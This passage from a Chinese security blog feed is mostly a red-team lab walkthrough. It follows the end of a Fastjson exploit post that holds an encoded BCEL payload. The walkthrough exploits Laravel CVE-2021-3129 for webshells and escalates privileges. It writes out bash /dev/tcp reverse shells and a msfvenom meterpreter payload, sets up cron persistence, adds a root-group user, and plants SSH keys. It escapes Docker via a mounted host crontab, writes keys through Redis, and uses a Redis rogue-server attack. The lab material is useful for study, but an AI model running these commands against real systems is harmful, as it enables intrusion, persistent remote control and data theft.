class="line">                &quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot; +</span><br><span class="line">                &quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</span><br><span class="line">                &quot;                &#125;,\n&quot; +</span><br><span class="line">                &quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\&quot;\n&quot; +</span><br><span class="line">                &quot;        &#125;\n&quot; +</span><br><span class="line">                &quot;    &#125;: \&quot;Moc\&quot;\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line">        JSON.parse(payload2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="templatesimpl"><a class="markdownIt-Anchor" href="#templatesimpl"></a> TemplatesImpl</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#背景&quot;&gt;&lt;/a&gt; 背景&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/Bossfrank/article/details/130100893&quot;&gt;http</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://j3f5.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>红队靶场-7</title>
    <link href="https://j3f5.github.io/articles/2023/07/13/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/"/>
    <id>https://j3f5.github.io/articles/2023/07/13/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/</id>
    <published>2023-07-13T12:49:46.000Z</published>
    <updated>2023-07-13T12:49:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础环境设置"><a class="markdownIt-Anchor" href="#基础环境设置"></a> 基础环境设置</h1><p>192.168.95.143</p><p><a href="https://www.cnblogs.com/9eek/p/16703300.html">https://www.cnblogs.com/9eek/p/16703300.html</a></p><h1 id="ubuntu1-web1"><a class="markdownIt-Anchor" href="#ubuntu1-web1"></a> Ubuntu1 web1</h1><h2 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h2><p>开启端口： 22 ssh/ 80 81 laravel / 6379 redis2.8.17 / os linux4.15-5.8</p><h2 id="攻击laravel"><a class="markdownIt-Anchor" href="#攻击laravel"></a> 攻击Laravel</h2><p>扫描发现80 81 6379端口，访问80端口发现是Nginx代理到81端口了，访问81端口，发现Laravel PHP框架，存在漏洞：CVE-2021-3129 Laravel Debug mode 远程代码执行漏洞。<a href="https://blog.csdn.net/weixin_46944519/article/details/123241080">https://blog.csdn.net/weixin_46944519/article/details/123241080</a></p><p>验证：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.95.52:81</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: XSRF-TOKEN=eyJpdiI6IlppM3EyQjJ6U0htNkozTUNzOC9qZHc9PSIsInZhbHVlIjoicEt2bG9zbXNoSnUvb3BpTERlWGgvQ25OTHVHY2pzckFBdVZzd0JJbjd4RStUdUw5dEFrOFR2SzBQVVYzSXEvMGErLzRlWWN3NEs1cENSMmxQTTA1bEhoVW1NUkUyVDZuZFpvMytRaVkrVFQ4Tnhqc1ZKT1RxbmdLbVE1M2drM0wiLCJtYWMiOiIzNGRiNWFjYzE1YzE4MWMwNDA1Zjc1MWU1MzI4NjNkZjNmZTU2MzhkYzAzMWMxYTE2YTY3YjMzMTNlNGQ5MjBiIn0%3D; laravel_session=eyJpdiI6IkFYSytHN1VMbndGSlp4OXRMMDZaU1E9PSIsInZhbHVlIjoiVGZ5VGVMMklKRTVmWGlrVUl5WlkrNFptNXpCQTNCWmtpdlprWExiQUVsZVpWL0lwdzZKaXJCQ2NSTnBXV3A3T0E3WFpncHhnV05kZ3NSNUx6TFhEQ2xnYkxacXlNN2ZVSXJZZTMvVG9kaHhqRmYySVRFc0NMSlhRUnQ5V21PdDIiLCJtYWMiOiI3MTgwNTUxYjkxNDFjNzczNWYwMjRkMzg1NWVmNDc2NGIzYTc5ZGM0MmRkNWQ3M2ZjYzJjOGM3NTBjNzU4M2FlIn0%3D</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;index&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用EXP：<a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP%EF%BC%8C%E5%BE%97%E5%88%B0webshell">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP，得到webshell</a></p><p>使用EXP：<a href="https://github.com/ajisai-babu/CVE-2021-3129-exp%EF%BC%8C%E5%BE%97%E5%88%B0webshell%EF%BC%88%E8%9A%81%E5%89%91%EF%BC%89">https://github.com/ajisai-babu/CVE-2021-3129-exp，得到webshell（蚁剑）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用上面的exp，他要用哥斯拉，我硬是连不上，绝了</span><br><span class="line">webshell地址:http://192.168.95.52:81/fuckyou.php,密码:pass</span><br><span class="line">使用另外的EXP</span><br><span class="line">[OK] 成功写入webshell, 访问地址 http://10.131.210.214:81/shell.php , 密码 whoami</span><br></pre></td></tr></table></figure><p>发现目录：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714093124402.png" alt="image-20230714093124402" /></p><p>上传linenum搜集信息，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 另一个网段</span><br><span class="line">nameserver 192.168.52.2</span><br><span class="line"># Sudo version 可以进行sudo提权（&lt;1.8.28）</span><br><span class="line">Sudo version 1.8.27</span><br><span class="line"># 安装的程序</span><br><span class="line">/usr/bin/gcc</span><br></pre></td></tr></table></figure><p>更看到一个SUID，名字叫shell，看到源码，执行一下发现，不知道可不可以进行环境变量提权，看条件，他没有出现<code>.</code>这个字符，</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714095845843.png" alt="image-20230714095845843" /></p><p>去看看任务：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714100122687.png" alt="image-20230714100122687" /></p><p>完全没发现，我们是在一个docker里面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> Hostname:</span><br><span class="line">8e172820ac78</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714104612542.png" alt="image-20230714104612542" /></p><p>看来现在首先要做的就是docker逃逸了，但是得先提权，sudo和suid环境变量提权都是可以的</p><h2 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h2><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111147194.png" alt="image-20230714111147194" /></p><p>反弹个shell，用msf接管：<code>system('bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.131.210.172/4444 0&gt;&amp;1&quot;');</code></p><h3 id="suid环境变量提权"><a class="markdownIt-Anchor" href="#suid环境变量提权"></a> SUID+环境变量提权</h3><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111401102.png" alt="image-20230714111401102" /></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111503937.png" alt="image-20230714111503937" /></p><blockquote><p>坑点：在蚁剑的webshell终端里，执行这个PATH没用。还有我以为只有当<code>$PATH</code>里面有<code>.</code>才能算有利用的可能，其实不是的，最重要是有可以以root执行系统命令的二进制文件，然后通过环境变量替换执行的系统命令。把我们伪造的命令PATH放到最前面，先解析。</p></blockquote><p>生成msf木马，由meterpreter接管。即权限维持，这里有多种方式</p><ol><li><p>计划任务</p><p>生成msfvenom木马，上传：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.131.210.172 LPORT=4545 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714114410437.png" alt="image-20230714114410437" /></p><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;echo &#x27;*/1 * * * * /bin/bash /tmp/shell.elf;/bin/bash --noprofile -i&#x27;)|crontab -</span><br></pre></td></tr></table></figure><p>但是没有，所以就放到这把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#这几个路径都可以存放cron执行脚本,对应的时间不同</span><br><span class="line">/etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/ /etc/cron.monthly/ </span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714131934378.png" alt="image-20230714131934378" /></p></li><li><p>启动项</p></li><li><p>添加用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">useradd jeff</span><br><span class="line">passwd jjj</span><br><span class="line">usermod -aG root jeff</span><br><span class="line">#检查</span><br><span class="line">groups jeff</span><br></pre></td></tr></table></figure></li><li><p>公私钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa //生成公钥</span><br><span class="line">echo id_rsa.pub &gt;&gt; .ssh/authorized_keys  //将id_rsa.pub内容放到目标.ssh/authorized_keys里</span><br><span class="line"></span><br><span class="line">echo read_team_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li><li><p>改密码</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714113900832.png" alt="image-20230714113900832" /></p></li></ol><p>因为是docker，所以，ssh没用，crontab没用也差不多</p><h3 id="sudo提权"><a class="markdownIt-Anchor" href="#sudo提权"></a> sudo提权</h3><p>它竟然有好多个版本，但是都没有成功：</p><h4 id="cve-2021-3156"><a class="markdownIt-Anchor" href="#cve-2021-3156"></a> CVE-2021-3156</h4><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714133329073.png" alt="image-20230714133329073" /></p><h4 id="cve-2023-22809"><a class="markdownIt-Anchor" href="#cve-2023-22809"></a> <a href="https://blog.csdn.net/weixin_46944519/article/details/129971508">CVE-2023-22809</a></h4><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714133643490.png" alt="image-20230714133643490" /></p><p><a href="https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc">https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc</a></p><h2 id="docker逃逸"><a class="markdownIt-Anchor" href="#docker逃逸"></a> docker逃逸</h2><p>发现目录存在：<code>.dockerenv</code>的时候就说明我们在docker里面了，也可以查看<code>cat /proc/1/cgroup</code></p><p>参考：<a href="https://blog.csdn.net/qq_41874930/article/details/109216506">https://blog.csdn.net/qq_41874930/article/details/109216506</a></p><ol><li>利用dirty cow来进行docker逃逸</li><li>cve-2019-5736</li><li>docker配置不当</li></ol><p>总的来说，docker逃逸大部分原因都是配置出现的错误，导致能够在docker机里面直接修改宿主机的一些文件，包括挂载了socket、procfs、/等，只有少部分是由于内核漏洞导致的，所以处理好配置问题，docker逃逸应该挺难。</p><h3 id="脏牛漏洞docker逃逸"><a class="markdownIt-Anchor" href="#脏牛漏洞docker逃逸"></a> 脏牛漏洞docker逃逸</h3><p>脏牛漏洞的成因是get_user_page内核函数在处理Copy-on-Write过程时，可能产生竞态条件，导致<strong>出现了能够写数据到进程空间只读内存区域的机会</strong>。</p><p>linux中存在VDSO小型共享库，能将内核自动映射到用户程序的地址空间，<strong>即将内核函数映射到内存</strong>。</p><p>当linux存在脏牛漏洞时，我们可以利用脏牛漏洞获取到<strong>内存的写权限</strong>，便可以写入shellcode到VDSO中，使得调用正常函数时执行shellcode，进而反弹shell，从而实现dokcer逃逸。</p><p>exp：<a href="https://github.com/scumjr/dirtycow-vdso.git">https://github.com/scumjr/dirtycow-vdso.git</a></p><h3 id="cve-2020-15257逃逸"><a class="markdownIt-Anchor" href="#cve-2020-15257逃逸"></a> CVE-2020-15257逃逸</h3><h3 id="cve-2019-5736"><a class="markdownIt-Anchor" href="#cve-2019-5736"></a> CVE-2019-5736</h3><p>该漏洞（CVE-2019-5736）是2019年爆出的。在Docker 18.09.2之前的版本中使用的runc版本小于1.0-rc6，其允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p><p>利用该漏洞需要满足以下两个条件之一：</p><blockquote><p>由一个攻击者控制的恶意镜像创建</p><p>攻击者具有某已存在容器的写权限，且可通过docker exec进入。</p></blockquote><p>参考：<a href="https://blog.csdn.net/qq_41874930/article/details/109216506">https://blog.csdn.net/qq_41874930/article/details/109216506</a></p><p><strong>注意！docker需要重启才能出发漏洞，怎么说都有点鸡肋。</strong></p><h3 id="docker配置不当"><a class="markdownIt-Anchor" href="#docker配置不当"></a> docker配置不当</h3><h4 id="特权逃逸"><a class="markdownIt-Anchor" href="#特权逃逸"></a> <a href="https://blog.csdn.net/weixin_53090346/article/details/129708068">特权逃逸</a></h4><p>原理十分简单，特权模式使得宿主机磁盘被挂载到了docker的目录，修改docker目录中的/etc/crontab相当于修改了宿主机的/etc/crontab</p><p>应该判断：<strong>判断是否特全模式启动</strong>：<code>cat /proc/self/status | grep Cap</code>。对应掩码为0000003fffffffff</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714144825877.png" alt="image-20230714144825877" /></p><ol><li><p>在docker中创建目录，然后将宿主机的磁盘挂载到新建的目录中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line"># return</span><br><span class="line">Device     Boot    Start      End  Sectors Size Id Type</span><br><span class="line">/dev/sda1  *        2048 16779263 16777216   8G 83 Linux</span><br><span class="line"></span><br><span class="line">mkdir /jeff</span><br><span class="line">mount /dev/sda1 /jeff</span><br></pre></td></tr></table></figure></li><li><p>将反弹shell等写入计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/10.131.210.172/4666 0&gt;&amp;1&quot; &gt;/jeff/jeff.sh</span><br><span class="line">echo &quot;* * * * * root bash /jeff.sh&quot; &gt;&gt; /jeff/etc/crontab</span><br></pre></td></tr></table></figure></li><li><p>成功</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714145429570.png" alt="image-20230714145429570" /></p></li></ol><p>当然，我们可以通过写入计划任务的方式在宿主机执行metasploit生成的命令。它就是ubuntu2</p><p>首先使用metasploit的web_delivery模块生成payload命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target 6    # 选择目标系统</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.131.210.172</span><br><span class="line">set lport 8023</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>然后OK</p><h1 id="ubuntu1主机上线msf"><a class="markdownIt-Anchor" href="#ubuntu1主机上线msf"></a> Ubuntu1主机上线msf</h1><p>因为逃逸的关系，所以直接打上ubuntu2了，但是ubuntu1的权限该拿还得拿，发现之前有个redis，还有ssh，那估计就是redis写ssh密钥来获取权限了。（他没有运行什么脚本，不能上传webshell，当然，写计划任务反弹shell也行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.基本命令：</span><br><span class="line">        查看数据库中的内容：keys * （redis数据库没有表，是大量的键值对组成的）</span><br><span class="line">        添加键值对：set qiao wang（意思为键为qiao，值为wang），输入get qiao，会输出wang</span><br><span class="line">        删除键值对：del qiao</span><br></pre></td></tr></table></figure><h2 id="redis写入ssh"><a class="markdownIt-Anchor" href="#redis写入ssh"></a> redis写入ssh</h2><p>影响版本小于redis-4.0.10，而这个redis是2.8版本的，完全OK</p><p>生成ssh密钥对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>然后连接受害主机的redis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ redis-cli -h 10.131.210.214</span><br><span class="line">10.131.210.214:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/home/web&quot;</span><br><span class="line">10.131.210.214:6379&gt; config set dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/root/.ssh&quot;</span><br><span class="line">10.131.210.214:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; set xz &quot;\n\n\n ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgvTycRe11wx+3Q+UqCBCVJB9LYwUEk9h5+b7Ul3QJ8Kgwo7SLYnSNFBdPwEFoovPAiu8U5ez8F9ZINWHrCVdFAdS/Dwk/plmTUfySkeohYFvAtyVY7va1boqEFbBqH+Y8NnAPMvJrKS9ooV4PcFlPVyNTJEMAsthIXOTpZxtPyYjntdTMZUnz2blq2uolqyPcwh6xQ2CrYaJcbOhoGDHIa7N6HzknJ0RMuXUGaZdgxHGCr+m6UW2IVobDtUEGDRQEyynbfE54P6kMNiIsDdlT2KkZpyWBMCEP0ouI79puC9zPOkac3wP6gpFy2cv2GehcbKc1V2WSNtfW/b0I8M7QmSrmh4Vd3O4vGpFRsh9pY/DLqpyYXuHHuPFgZlHU4m0fF+/bmWG72I1ywYJm+1v2EFmydjcaCkq9qCAb89DqeAh9qQXEIDbgekqxcRRIeQ5lRMrfRrU+uAfkLaUot9UTx6NePMSufPPVFo6pSh0Z1rhFZh0QorMlRZpOa6U7WBc= j3fffff@j3fffff  \n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; </span><br></pre></td></tr></table></figure><p>然后连接ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">──(j3fffff㉿j3fffff)-[/root/.ssh]</span><br><span class="line">└─$ ssh -i /home/j3fffff/.ssh/red_team_rsa root@10.131.210.214</span><br></pre></td></tr></table></figure><h2 id="写入计划任务"><a class="markdownIt-Anchor" href="#写入计划任务"></a> 写入计划任务</h2><pre><code>10.131.210.214:6379&gt; config set dir /var/spool/cron10.131.210.214:6379&gt; set h4ck &quot;\n * * * * * bash -i &gt;&amp; /dev/tcp/10.131.210.172/4667 0&gt;&amp;1 \n&quot;10.131.210.214:6379&gt; save</code></pre><p>但是不知道为啥会乱码，不成功</p><h2 id="主从复制"><a class="markdownIt-Anchor" href="#主从复制"></a> 主从复制</h2><p>使用项目：<code>https://github.com/Dliv3/redis-rogue-server</code></p><p>命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">适用于目标Redis服务处于外网的情况</span><br><span class="line"></span><br><span class="line">    外网Redis未授权访问</span><br><span class="line">    已知外网Redis口令</span><br><span class="line"></span><br><span class="line">启动redis rogue server，并主动连接目标redis服务发起攻击</span><br><span class="line"></span><br><span class="line">python3 redis-rogue-server.py --rhost &lt;target address&gt; --rport &lt;target port&gt; --lhost &lt;vps address&gt; --lport &lt;vps port&gt;</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line">    --rpasswd 如果目标Redis服务开启了认证功能，可以通过该选项指定密码</span><br><span class="line">    --rhost 目标redis服务IP</span><br><span class="line">    --rport 目标redis服务端口，默认为6379</span><br><span class="line">    --lhost vps的外网IP地址</span><br><span class="line">    --lport vps监控的端口，默认为21000</span><br><span class="line"></span><br><span class="line">攻击成功之后，你会得到一个交互式shell</span><br></pre></td></tr></table></figure><p>攻击步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python redis_rogue_server.py -v(攻击机)</span><br><span class="line">config set dir /tmp</span><br><span class="line">config set dbfilename moudle.so</span><br><span class="line">slaveof ip port（端口是脚本启动的端口）</span><br><span class="line">module load ./moudle.so</span><br><span class="line">slaveof NO ONE（断掉主从模式）</span><br><span class="line">nc -lvvp port（攻击机）</span><br><span class="line">system.rev ip port（反弹shell接收的端口）</span><br></pre></td></tr></table></figure><p>此时可以使用命令：<a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; system.exec &quot;id&quot;</span><br><span class="line">&quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;</span><br><span class="line">127.0.0.1:6379&gt; system.exec &quot;whoami&quot;</span><br><span class="line">&quot;root\n&quot;</span><br><span class="line">127.0.0.1:6379&gt; system.rev 127.0.0.1 9999</span><br></pre></td></tr></table></figure><p>假如redis在内网，需要使用ssrf来控制主机主动连接我们的恶意主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">被动连接模式</span><br><span class="line">适用于目标Redis服务处于内网的情况</span><br><span class="line"></span><br><span class="line">    通过SSRF攻击Redis</span><br><span class="line">    内网Redis未授权访问/已知Redis口令, Redis需要反向连接redis rogue server</span><br></pre></td></tr></table></figure><p>但是我这没成功，返回<code>[-&gt;] b&quot;-ERR unknown command 'MODULE'\r\n&quot;</code></p><h1 id="ubuntu2主机上线msf"><a class="markdownIt-Anchor" href="#ubuntu2主机上线msf"></a> Ubuntu2主机上线msf</h1><p>赶紧写ssh密钥啊！先上线meterpreter!</p><p>使用 <code>post/multi/manage/shell_to_meterpreter </code>模块来将 shell 升级为 meterpreter。</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714152845811.png" alt="image-20230714152845811" /></p><h2 id="信息搜集-2"><a class="markdownIt-Anchor" href="#信息搜集-2"></a> 信息搜集</h2><p>当连接4666端口时，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Command shell session 1 opened (10.131.210.172:4666 -&gt; 10.131.210.104:8099) at 2023-07-17 10:28:06 +0800</span><br></pre></td></tr></table></figure><p>然后搜集网卡信息，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">br-05384b1b0df2 Link encap:Ethernet  HWaddr 02:42:a5:2b:31:45  </span><br><span class="line">          inet addr:172.18.0.1  Bcast:172.18.255.255  Mask:255.255.0.0</span><br><span class="line">br-1d665e13ee58 Link encap:Ethernet  HWaddr 02:42:fe:3c:7e:8b  </span><br><span class="line">          inet addr:172.20.0.1  Bcast:172.20.255.255  Mask:255.255.0.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:a1:6e:d8  </span><br><span class="line">          inet addr:192.168.52.20  Bcast:192.168.52.255  Mask:255.255.255.0</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0c:29:a1:6e:e2  </span><br><span class="line">          inet addr:192.168.93.10  Bcast:192.168.93.255  